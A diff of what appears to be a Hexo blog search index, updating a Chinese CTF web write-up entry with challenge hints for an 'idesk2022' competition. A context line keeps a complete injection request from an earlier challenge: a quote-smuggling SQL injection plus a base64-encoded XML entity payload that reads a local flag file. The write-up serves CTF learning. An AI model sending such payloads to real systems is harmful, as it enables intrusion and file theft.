@@ -2567,7 +2567,7 @@
   <entry>
     <title>比赛题目wp&amp;感悟记录</title>
     <url>/2022/06/26/Game-wp/</url>
-    <content><![CDATA[<p><code>以下是本人凑人数参加的各类比赛的题目做题经历，在此记录学习过程，望大佬指点修正</code></p>
+    <content><![CDATA[<p><code>以下是本人凑人数参加的各类比赛的题目做web题经历，在此记录学习过程，望大佬指点修正</code></p>
 <span id="more"></span>
 
 <h1 id="NewStarCTF公开赛"><a href="#NewStarCTF公开赛" class="headerlink" title="NewStarCTF公开赛"></a>NewStarCTF公开赛</h1><p><code>虽然是别人学校的新生赛，难度不是很高，但是还是有许多值得学习的知识点</code></p>
@@ -3095,7 +3095,41 @@
 <p><code>password=1$&#123;@java.lang.Character@toString(39)&#125;) or 1=1#&amp;poc=AAAAPAAAACEAAABEAAAATwAAAEMAAABUAAAAWQAAAFAAAABFAAAAIAAAAHQAAABlAAAAcwAAAHQAAAAgAAAAWwAAACAAAAAKAAAACQAAADwAAAAhAAAARQAAAE4AAABUAAAASQAAAFQAAABZAAAAIAAAAHgAAAB4AAAAZQAAACAAAABTAAAAWQAAAFMAAABUAAAARQAAAE0AAAAgAAAAIgAAAGYAAABpAAAAbAAAAGUAAAA6AAAALwAAAC8AAAAvAAAAZgAAAGwAAABhAAAAZwAAACIAAAA%2BAAAAIAAAAAoAAABdAAAAPgAAACAAAAAKAAAAPAAAAHcAAABzAAAAdwAAAD4AAAAmAAAAeAAAAHgAAABlAAAAOwAAADwAAAAvAAAAdwAAAHMAAAB3AAAAPg%3D%3D&amp;type=&quot;string&quot;&amp;yourclasses=java.io.ByteArrayInputStream,[B,org.xml.sax.InputSource,java.io.InputStream</code></p>
 </blockquote>
 <p><img src="/2022/06/26/Game-wp/image-20230125004553248.png" alt="image-20230125004553248"></p>
-<h2 id="PrettierOnline"><a href="#PrettierOnline" class="headerlink" title="PrettierOnline"></a>PrettierOnline</h2><h2 id="filecheacker-mini"><a href="#filecheacker-mini" class="headerlink" title="filecheacker_mini"></a>filecheacker_mini</h2><h2 id="filecheacker-pro"><a href="#filecheacker-pro" class="headerlink" title="filecheacker_pro"></a>filecheacker_pro</h2><h2 id="filecheacker-pro-max"><a href="#filecheacker-pro-max" class="headerlink" title="filecheacker_pro_max"></a>filecheacker_pro_max</h2>]]></content>
+<h2 id="PrettierOnline"><a href="#PrettierOnline" class="headerlink" title="PrettierOnline"></a>PrettierOnline</h2><h2 id="filecheacker-mini"><a href="#filecheacker-mini" class="headerlink" title="filecheacker_mini"></a>filecheacker_mini</h2><h2 id="filecheacker-pro"><a href="#filecheacker-pro" class="headerlink" title="filecheacker_pro"></a>filecheacker_pro</h2><h2 id="filecheacker-pro-max"><a href="#filecheacker-pro-max" class="headerlink" title="filecheacker_pro_max"></a>filecheacker_pro_max</h2><h1 id="idesk2022"><a href="#idesk2022" class="headerlink" title="idesk2022"></a>idesk2022</h1><h2 id="Readme"><a href="#Readme" class="headerlink" title="Readme"></a>Readme</h2><blockquote>
+<p>hint:Just read the flag!</p>
+<p>看看旗帜!</p>
+</blockquote>
+<h2 id="SimpleFileServer"><a href="#SimpleFileServer" class="headerlink" title="SimpleFileServer"></a>SimpleFileServer</h2><blockquote>
+<p>hint:All I wanted was a website letting me host files anonymously for free, for ever</p>
+<p>我想要的只是一个网站，让我可以永远匿名地保存文件</p>
+</blockquote>
+<h2 id="Paywall"><a href="#Paywall" class="headerlink" title="Paywall"></a>Paywall</h2><blockquote>
+<p>hint:Check out this local news paper I built using PHP! You’ll need to pay in order to view the good stuff though :)</p>
+<p>看看我用PHP构建的本地报纸吧!不过，你需要付费才能看到好东西:)</p>
+</blockquote>
+<h2 id="JSON-Beautifier"><a href="#JSON-Beautifier" class="headerlink" title="JSON Beautifier"></a>JSON Beautifier</h2><blockquote>
+<p>hint:Turn your weak, ugly JSON into a thing of beauty using my revolutionary new tool! note: the flag is stored in the admin’s cookie</p>
+<p>使用我的革命性的新工具，把你的弱，丑陋的JSON变成一个美丽的东西!注意:该标志存储在管理员的cookie中</p>
+</blockquote>
+<h2 id="badblocker"><a href="#badblocker" class="headerlink" title="badblocker"></a>badblocker</h2><blockquote>
+<p>hint:Stay one step ahead of ads with 🅱️ad🅱️locker™, the net’s one-and-only recursive adblocker!</p>
+<p>保持一步领先的广告🅱️广告🅱️储物柜™，网络的一个和唯一的递归广告拦截器!</p>
+</blockquote>
+<h2 id="task-manager"><a href="#task-manager" class="headerlink" title="task manager"></a>task manager</h2><blockquote>
+<p>hint:Are you constantly procrastinating real work by spending too much time on ctfs? Me too! That’s why I created this lit af task manager app to help us stay on top of our duties.</p>
+<p>你是否经常因为在ctfs上花费太多时间而拖延真正的工作?我也是!这就是为什么我创建了这个任务管理器应用程序来帮助我们保持我们的职责。</p>
+</blockquote>
+<h2 id="Proxy-Viewer"><a href="#Proxy-Viewer" class="headerlink" title="Proxy Viewer"></a>Proxy Viewer</h2><blockquote>
+<p>hint:check out my epic proxy service for viewing websites! however, you’ll need to pay me in cash if you want to be a premium member</p>
+<p>NOTE: there is significant rate limiting in place to keep the challenge healthy. please deploy, test, and solve locally before attempting to solve on the remote instance</p>
+<p>看看我的史诗代理服务查看网站!但是，如果你想成为高级会员，你需要支付现金</p>
+<p>注意:有显著的速率限制，以保持挑战的健康。在尝试在远程实例上求解之前，请在本地部署、测试和求解</p>
+</blockquote>
+<h2 id="Stargazer"><a href="#Stargazer" class="headerlink" title="Stargazer"></a>Stargazer</h2><blockquote>
+<p>hint:I am creating this challenge while gazing the stars. Hoping there’s no bug when developing the chall</p>
+<p>我在凝视星空的时候创造了这个挑战。希望在开发chall时没有bug</p>
+</blockquote>
+]]></content>
       <categories>
         <category>网络安全学习</category>
       </categories>
